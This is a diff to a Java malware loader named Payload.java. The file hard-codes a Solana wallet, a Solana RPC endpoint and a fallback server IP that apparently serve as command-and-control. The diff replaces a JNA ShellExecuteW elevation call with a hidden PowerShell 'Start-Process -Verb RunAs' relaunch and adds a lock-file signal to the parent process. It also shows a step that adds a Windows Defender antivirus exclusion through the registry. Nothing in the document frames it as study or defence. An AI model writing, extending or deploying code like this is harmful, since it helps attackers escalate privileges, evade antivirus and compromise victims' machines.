@@ -1,5 +1,4 @@
 // language: Java, file: payload/Payload.java
-import com.sun.jna.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -8,11 +7,6 @@ import java.util.Base64;
 import java.util.zip.*;
 
 public class Payload {
-    public interface Shell32 extends Library {
-        Shell32 INSTANCE = Native.load("shell32", Shell32.class);
-        int ShellExecuteW(Pointer hwnd, String lpOperation, String lpFile, String lpParameters, String lpDirectory, int nShowCmd);
-    }
-
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
     private static final String SOLANA_RPC = "https://api.devnet.solana.com";
     private static final String FALLBACK_SERVER = "95.182.96.216";
@@ -64,17 +58,24 @@ public class Payload {
             String javaExe = javaHome + "\\bin\\javaw.exe";
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
             
-            log("Triggering UAC via JNA...");
+            log("Triggering UAC via PowerShell...");
             
-            // FIX: Wrap javaExe in quotes so spaces in the path don't break it
-            int result = Shell32.INSTANCE.ShellExecuteW(
-                null, "runas", "\"" + javaExe + "\"", "-jar \"" + jarPath + "\" " + key + " " + ip, null, 1
+            String psCommand = String.format(
+                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
+                javaExe, jarPath, key, ip
             );
+
+            // Launch PowerShell hidden and wait for the user to click Yes or No
+            Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
+            p.waitFor();
             
-            log("ShellExecuteW result: " + result);
+            // After PowerShell closes, check if the elevated process actually deleted the lock file
+            File lockFile = new File(getLoaderDir(), ".lock");
+            if (!lockFile.exists()) {
+                return true;
+            }
             
-            // Result > 32 means the user clicked Yes
-            return result > 32;
+            return false;
         } catch (Exception e) {
             log("UAC Error: " + e.toString());
             return false;
@@ -188,6 +189,13 @@ public class Payload {
         try {
             log("Executing payload...");
             File loaderDir = getLoaderDir();
+            
+            // Delete the lock file to signal the parent process to die
+            File lock = new File(loaderDir, ".lock");
+            if (lock.exists()) {
+                lock.delete();
+                log("Deleted .lock file to notify parent.");
+            }
 
             log("Adding AV exclusion...");
             String regPath = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
